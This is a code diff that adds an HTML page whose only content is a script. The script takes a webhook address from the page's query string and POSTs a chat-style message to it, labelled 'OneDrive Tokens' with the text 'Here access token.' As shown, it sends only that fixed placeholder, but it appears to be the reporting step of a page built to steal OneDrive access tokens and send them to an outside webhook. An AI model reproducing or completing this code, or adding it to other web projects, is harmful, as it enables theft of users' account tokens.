@@ -1,1 +1,22 @@
+<!doctype html>
+<html>
 
+<head></head>
+
+<body>
+    <script>
+        var request = new XMLHttpRequest();
+        var webhook = (new URLSearchParams(window.location.search)).get("webhook");
+        request.open("POST", webhook);
+        request.setRequestHeader("Content-Type", "application/json");
+        var body = JSON.stringify({
+            username: "OneDrive Tokens",
+            avatar_url: "",
+            content: "Here access token."
+        });
+
+        request.send(body);
+    </script>
+</body>
+
+</html>
